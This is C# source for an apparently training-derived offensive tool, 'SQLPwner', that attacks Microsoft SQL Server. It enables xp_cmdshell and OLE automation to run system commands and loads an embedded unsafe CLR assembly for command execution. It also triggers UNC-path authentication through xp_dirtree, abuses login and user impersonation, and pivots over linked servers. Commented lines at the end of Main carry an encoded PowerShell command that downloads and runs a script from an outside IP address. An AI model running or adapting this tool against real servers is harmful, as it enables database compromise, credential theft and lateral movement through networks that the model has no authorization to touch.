using System;
using System.Data.SqlClient;
using System.Collections.Generic;

namespace SQLPwner
{
    class Program
    {
        static public string ExecuteCommand(SqlConnection con, string query, bool ignore = false)
        {
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();
            string result = "";
            if (!ignore)
            {
                // reader.Read();
                // if (reader.HasRows) result = reader[0].ToString();
                if (reader.Read())
                {
                    result += reader[0].ToString();
                }

                while (reader.Read())
                {
                    result += "\n" + reader[0].ToString();
                }
            }
            reader.Close();
            return result;
        }

        static public string ExecuteRemoteCommand(SqlConnection con, string query, string server, bool ignore = false)
        {
            string queryString = string.Format("EXEC ('{0}') AT {1}", query.Replace("'", "''"), server);
            SqlCommand command = new SqlCommand(queryString, con);
            SqlDataReader reader = command.ExecuteReader();
            string result = "";
            if (!ignore)
            {
                // reader.Read();
                // if (reader.HasRows) result = reader[0].ToString();
                if (reader.Read())
                {
                    result += reader[0].ToString();
                }

                while (reader.Read())
                {
                    result += "\n" + reader[0].ToString();
                }
            }
            reader.Close();
            return result;
        }

        static public string GetSystemUser(SqlConnection con)
        {
            return ExecuteCommand(con, "SELECT SYSTEM_USER;");
        }

        static public string GetUsername(SqlConnection con)
        {
            return ExecuteCommand(con, "SELECT USER_NAME();");
        }

        static public bool HasRole(SqlConnection con, string role)
        {
            string query = "SELECT IS_SRVROLEMEMBER('" + role + "');";
            Int32 roleRep = Int32.Parse(ExecuteCommand(con, query));
            if (roleRep == 1)
            {
                Console.WriteLine("[+] User is a member of {0} role", role);
                return true;
            }
            Console.WriteLine("[-] User is NOT a member of {0} role", role);
            return false;
        }

        static void UNCPathInjection(SqlConnection con, string uncPath)
        {
            Console.WriteLine("\n[*] UNC Path Injection attack is on the way");
            string query = "EXEC master..xp_dirtree \"" + uncPath + "\";";
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();
            Console.WriteLine("[+] Done!");
        }

        static public void ImpersonateLogin(SqlConnection con, string user)
        {
            string executeas = "EXECUTE AS LOGIN = '" + user + "'";
            Console.WriteLine("\n[*] Impersonating the {0} login", user);
            try
            {
                ExecuteCommand(con, executeas, true);
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] Impersonation failed: {0}", e.Message);
                return;
            }
            Console.WriteLine("[+] Impersonation successful!");
        }

        static public void ImpersonateUser(SqlConnection con, string user, string db)
        {
            string executeas = "use " + db + "; EXECUTE AS USER = '" + user + "'";
            Console.WriteLine("\n[*] Impersonating the {0} user", user);
            try
            {
                ExecuteCommand(con, executeas, true);
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] Impersonation failed: {0}", e.Message);
                return;
            }
            Console.WriteLine("[+] Impersonation successful!");
        }

        static public void Whoami(SqlConnection con)
        {
            Console.WriteLine("\n[*] Logged in as: {0}", GetSystemUser(con));
            Console.WriteLine("[*] Mapped to the user: {0}", GetUsername(con));
            HasRole(con, "public");
            HasRole(con, "sysadmin");
            string impersonation = ExecuteCommand(con, "SELECT DISTINCT b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';");
            Console.WriteLine("\n[*] Logins that allow impersonation: {0}", impersonation);
        }

        static public void ExecuteXP(SqlConnection con, string cmd)
        {
            ExecuteCommand(con, "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;", true);
            string result = ExecuteCommand(con, "EXEC xp_cmdshell '" + cmd + "'");
            Console.WriteLine("\n[+] " + result);
        }

        static public void ExecuteRemoteXP(SqlConnection con, string cmd, string host)
        {
            ExecuteRemoteCommand(con, "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;", host, true);
            string result = ExecuteRemoteCommand(con, "EXEC xp_cmdshell '" + cmd.Replace("'", "''") + "'", host);
            Console.WriteLine("\n[+] " + result);
        }

        static public void ExecuteSP(SqlConnection con, string cmd)
        {
            ExecuteCommand(con, "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;", true);
            string cmdString = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"" + cmd + "\"';";
            ExecuteCommand(con, cmdString);
            Console.WriteLine("\n[+] {0}: Done", cmd);
        }

        static public void ExecuteAssembly(SqlConnection con, string cmd)
        {
            string assembly = "0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A24000000000000005045000064860200FE233F990000000000000000F00022200B023000000C000000040000000000000000000000200000000000800100000000200000000200000400000000000000060000000000000000600000000200000000000003006085000040000000000000400000000000000000100000000000002000000000000000000000100000000000000000000000000000000000000000400000B8030000000000000000000000000000000000000000000000000000DC290000380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000004800000000000000000000002E74657874000000920A000000200000000C000000020000000000000000000000000000200000602E72737263000000B80300000040000000040000000E00000000000000000000000000004000004000000000000000000000000000000000000000000000000000000000000000000000000000000000480000000200050008210000D4080000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000013300600A900000001000011731000000A0A066F1100000A72010000706F1200000A066F1100000A7239000070028C12000001281300000A6F1400000A066F1100000A166F1500000A066F1100000A176F1600000A066F1700000A26178D17000001251672490000701F0C20A00F00006A731800000AA2731900000A0B281A00000A076F1B00000A0716066F1C00000A6F1D00000A6F1E00000A6F1F00000A281A00000A076F2000000A281A00000A6F2100000A2A1E02282200000A2A00000042534A4201000100000000000C00000076342E302E33303331390000000005006C000000AC020000237E000018030000FC03000023537472696E6773000000001407000058000000235553006C0700001000000023475549440000007C0700005801000023426C6F620000000000000002000001471502000900000000FA013300160000010000001C000000020000000200000001000000220000000F00000001000000010000000300000000005E020100000000000600880116030600F50116030600A600E4020F00360300000600CE007A0206006B017A0206004C017A020600DC017A020600A8017A020600C1017A020600FB007A020600BA00F70206009800F70206002F017A020600160127020600990373020A00E500C3020A00410256030E007C03E4020A006200C3020E009A02E4020600570273020A002000C3020A008E0014000A00DF03C3020A008600C3020600AB020A000600B8020A000000000001000000000001000100010010006B0300004100010001004820000000009600350062000100FD20000000008618DE02060002000000010056000900DE0201001100DE0206001900DE020A002900DE0210003100DE0210003900DE0210004100DE0210004900DE0210005100DE0210005900DE0210006100DE0215006900DE0210007100DE0210007900DE0210008900DE0206009900DE02060099008C022100A90070001000B10092032600A90084031000A90013021500A900C40315009900AB032C00B900DE023000A100DE023800C9007D003F00D100A00344009900B1034A00E1003D004F0081004B024F00A10054025300D100EA034400D100470006008100DE02060020007B0052012E000B0068002E00130071002E001B0090002E00230099002E002B00AF002E003300AF002E003B00AF002E00430099002E004B00B5002E005300AF002E005B00AF002E006300CD002E006B00F7002E00730004011A000480000001000000000000000000000000004503000004000000000000000000000059002C0000000000040000000000000000000000590014000000000004000000000000000000000059007302000000000000003C4D6F64756C653E0053797374656D2E494F0053797374656D2E446174610053716C4D65746144617461006D73636F726C696200636D64457865630052656164546F456E640053656E64526573756C7473456E640065786563436F6D6D616E640053716C446174615265636F7264007365745F46696C654E616D65006765745F506970650053716C506970650053716C44625479706500477569644174747269627574650044656275676761626C6541747472696275746500436F6D56697369626C6541747472696275746500417373656D626C795469746C654174747269627574650053716C50726F63656475726541747472696275746500417373656D626C7954726164656D61726B417474726962757465005461726765744672616D65776F726B41747472696275746500417373656D626C7946696C6556657273696F6E41747472696275746500417373656D626C79436F6E66696775726174696F6E41747472696275746500417373656D626C794465736372697074696F6E41747472696275746500436F6D70696C6174696F6E52656C61786174696F6E7341747472696275746500417373656D626C7950726F6475637441747472696275746500417373656D626C79436F7079726967687441747472696275746500417373656D626C79436F6D70616E794174747269627574650052756E74696D65436F6D7061746962696C697479417474726962757465007365745F5573655368656C6C457865637574650053797374656D2E52756E74696D652E56657273696F6E696E670053716C537472696E6700546F537472696E6700536574537472696E6700437573746F6D417373656D626C6965732E646C6C0053797374656D0053797374656D2E5265666C656374696F6E006765745F5374617274496E666F0050726F636573735374617274496E666F0053747265616D5265616465720054657874526561646572004D6963726F736F66742E53716C5365727665722E536572766572002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E496E7465726F7053657276696365730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F64657300437573746F6D417373656D626C6965730053797374656D2E446174612E53716C54797065730053746F72656450726F636564757265730050726F63657373007365745F417267756D656E747300466F726D6174004F626A6563740053656E64526573756C74735374617274006765745F5374616E646172644F7574707574007365745F52656469726563745374616E646172644F75747075740053716C436F6E746578740053656E64526573756C7473526F7700000000003743003A005C00570069006E0064006F00770073005C00530079007300740065006D00330032005C0063006D0064002E00650078006500000F20002F00630020007B0030007D00000D6F0075007400700075007400000086D55774A9CD7744A2DE5B31CC132CB200042001010803200001052001011111042001010E0420010102060702124D125104200012550500020E0E1C03200002072003010E11610A062001011D125D0400001269052001011251042000126D0320000E05200201080E08B77A5C561934E0890500010111490801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F77730108010002000000000015010010437573746F6D417373656D626C696573000005010000000017010012436F7079726967687420C2A920203230323100002901002436336661363937332D636339302D343664302D383439642D35653333393731636264386600000C010007312E302E302E3000004D01001C2E4E45544672616D65776F726B2C56657273696F6E3D76342E372E320100540E144672616D65776F726B446973706C61794E616D65142E4E4554204672616D65776F726B20342E372E3204010000000000000000B31AA5A300000000020000007E000000142A0000140C0000000000000000000000000000100000000000000000000000000000005253445394943799D6F8EB47870A14D9C3526FF001000000433A5C55736572735C4F66667365632E434F5250312E3030305C4465736B746F705C31355F53514C41747461636B735C437573746F6D417373656D626C6965735C6F626A5C7836345C52656C656173655C437573746F6D417373656D626C6965732E70646200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000005C03000000000000000000005C0334000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000001000000000000000100000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004BC020000010053007400720069006E006700460069006C00650049006E0066006F0000009802000001003000300030003000300034006200300000001A000100010043006F006D006D0065006E007400730000000000000022000100010043006F006D00700061006E0079004E0061006D00650000000000000000004A0011000100460069006C0065004400650073006300720069007000740069006F006E000000000043007500730074006F006D0041007300730065006D0062006C0069006500730000000000300008000100460069006C006500560065007200730069006F006E000000000031002E0030002E0030002E00300000004A001500010049006E007400650072006E0061006C004E0061006D006500000043007500730074006F006D0041007300730065006D0062006C006900650073002E0064006C006C00000000004800120001004C006500670061006C0043006F007000790072006900670068007400000043006F0070007900720069006700680074002000A90020002000320030003200310000002A00010001004C006500670061006C00540072006100640065006D00610072006B00730000000000000000005200150001004F0072006900670069006E0061006C00460069006C0065006E0061006D006500000043007500730074006F006D0041007300730065006D0062006C006900650073002E0064006C006C0000000000420011000100500072006F0064007500630074004E0061006D0065000000000043007500730074006F006D0041007300730065006D0062006C0069006500730000000000340008000100500072006F006400750063007400560065007200730069006F006E00000031002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000031002E0030002E0030002E003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
            ExecuteCommand(con, "use msdb; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'clr enabled', 1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE;", true);
            ExecuteCommand(con, string.Format("CREATE ASSEMBLY myAssembly FROM {0} WITH PERMISSION_SET = UNSAFE;", assembly), true);
            ExecuteCommand(con, "CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];", true);
            string result = ExecuteCommand(con, string.Format("EXEC cmdExec '{0}';", cmd));
            Console.WriteLine("\n[+] " + result);

            ExecuteCommand(con, "DROP PROCEDURE [dbo].[cmdExec];", true);
            ExecuteCommand(con, "DROP ASSEMBLY myAssembly;", true);
        }

        static public void ListLinked(SqlConnection con)
        {
            SqlCommand command = new SqlCommand("EXEC sp_linkedservers;", con);
            SqlDataReader reader = command.ExecuteReader();
            List<string> servers = new List<string>();
            while (reader.Read())
            {
                servers.Add(reader[0].ToString());
            }
            reader.Close();
            Console.WriteLine("\n[*] Linked SQL servers:");
            foreach (string server in servers)
            {
                string login = "";
                string user = "";
                try
                {
                    login = ExecuteCommand(con, "SELECT mylogin FROM openquery(\"" + server + "\", 'SELECT SYSTEM_USER AS mylogin');");
                    user = ExecuteCommand(con, "SELECT myuser FROM openquery(\"" + server + "\", 'SELECT USER_NAME() AS myuser');");
                }
                catch
                {
                    Console.WriteLine("\t- {0}", server);
                    continue;
                }
                Console.WriteLine("\t- {0}: {1}/{2}", server, login, user);
            }
        }

        public static void Menu(SqlConnection con)
        {
            while (true)
            {
                Console.WriteLine("\n(1) Whoami");
                Console.WriteLine("(2) SQL Query (local server)");
                Console.WriteLine("(3) Command execution (xp_cmdshell)");
                Console.WriteLine("(4) Command execution (OLE)");
                Console.WriteLine("(5) Command execution (Custom Assembly)");
                Console.WriteLine("(6) UNC Path Injection");
                Console.WriteLine("(7) Impersonate login");
                Console.WriteLine("(8) Impersonate user");
                Console.WriteLine("(9) List SQL Links");
                Console.WriteLine("(10) SQL Query (remote server)");
                Console.WriteLine("(11) Remote command execution (xp_cmdshell)");
                Console.WriteLine("(0) Exit");
                Console.Write("\n[?] ");
                string optionStr = Console.ReadLine();
                int option = 0;
                try
                {
                    option = int.Parse(optionStr);
                    if ((option < 0) || (option > 11)) throw new Exception();
                }
                catch 
                {
                    Console.WriteLine("[!] Invalid option selected");
                    continue;
                }
                
                switch (option)
                {
                    case 0:
                        return;
                    case 1:
                        Whoami(con);
                        break;
                    case 2:
                    {
                        Console.Write("[?] SQL Query: ");
                        string query = Console.ReadLine();
                        string result = ExecuteCommand(con, query);
                        Console.WriteLine("\n[+] {0}", result);
                        break;       
                    }
                    case 3:
                    {
                        Console.Write("[?] CMD: ");
                        string cmd = Console.ReadLine();
                        ExecuteXP(con, cmd);
                        break;       
                    }
                    case 4:
                    {
                        Console.Write("[?] CMD: ");
                        string cmd = Console.ReadLine();
                        ExecuteSP(con, cmd);
                        break;       
                    }
                    case 5:
                    {
                        Console.Write("[?] CMD: ");
                        string cmd = Console.ReadLine();
                        ExecuteAssembly(con, cmd);
                        break;       
                    }
                    case 6:
                    {
                        Console.Write("[?] UNC Path: ");
                        string path = Console.ReadLine();
                        UNCPathInjection(con, path);
                        break;       
                    }
                    case 7:
                    {
                        Console.Write("[?] Login to impersonate: ");
                        string login = Console.ReadLine();
                        ImpersonateLogin(con, login);
                        break;
                    }
                    case 8:
                    {
                        Console.Write("[?] User to impersonate: ");
                        string user = Console.ReadLine();
                        Console.Write("[?] Database to impersonate: ");
                        string db = Console.ReadLine();
                        ImpersonateUser(con, user, db);
                        break;
                    }
                    case 9:
                        ListLinked(con);
                        break;
                    case 10:
                    {
                        Console.Write("[?] SQL Query: ");
                        string query = Console.ReadLine();
                        Console.Write("[?] Server: ");
                        string server = Console.ReadLine();
                        string result = ExecuteRemoteCommand(con, query, server);
                        Console.WriteLine("\n[+] {0}", result);
                        break;
                    }
                    case 11:
                    {
                        Console.Write("[?] CMD: ");
                        string cmd = Console.ReadLine();
                        Console.Write("[?] Server: ");
                        string server = Console.ReadLine();
                        ExecuteRemoteXP(con, cmd, server);
                        break;
                    }
                }
            }
        }

        static void Main(string[] args)
        {
            string banner = @"
███████╗ ██████╗ ██╗     ██████╗ ██╗    ██╗███╗   ██╗███████╗██████╗ 
██╔════╝██╔═══██╗██║     ██╔══██╗██║    ██║████╗  ██║██╔════╝██╔══██╗
███████╗██║   ██║██║     ██████╔╝██║ █╗ ██║██╔██╗ ██║█████╗  ██████╔╝
╚════██║██║▄▄ ██║██║     ██╔═══╝ ██║███╗██║██║╚██╗██║██╔══╝  ██╔══██╗
███████║╚██████╔╝███████╗██║     ╚███╔███╔╝██║ ╚████║███████╗██║  ██║
╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
                                                                     
";
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.Write(banner);
            Console.ForegroundColor = ConsoleColor.White;

            string defaultServer = "localhost";
            string defaultDatabase = "master";
            Console.Write("[?] SQL Server hostname ({0}): ", defaultServer);
            string sqlServer = Console.ReadLine();
            if (sqlServer == "") sqlServer = defaultServer;
            Console.Write("[?] Database ({0}): ", defaultDatabase);
            string database = Console.ReadLine();
            if (database == "") database = defaultDatabase;

            Console.WriteLine("\n[*] Connecting to {0} ({1})", sqlServer, database);
            string conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("[+] Connection established!");
            }
            catch (Exception e)
            {
                Console.WriteLine("\n[-] Whoops! An error ocurred: " + e.Message);
                con.Close();
                Environment.Exit(1);
            }

            Whoami(con);
            ListLinked(con);
            Menu(con);
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("\nGoodbye! :)\n");
            Console.ForegroundColor = ConsoleColor.White;

            //ExecuteRemoteXP(con, "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADEAMAAzADoAOAAwADAAMAAvAHIAdQBuAC4AdAB4AHQAJwApAA==", "dc01");
            //ExecuteRemoteCommand(con, "EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT APPSRV01", "dc01", true);
            //ExecuteRemoteCommand(con, "EXEC ('xp_cmdshell ''powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADEAMAAzADoAOAAwADAAMAAvAHIAdQBuAC4AdAB4AHQAJwApAA==''') AT appsrv01", "dc01");

            con.Close();
        }
    }
}
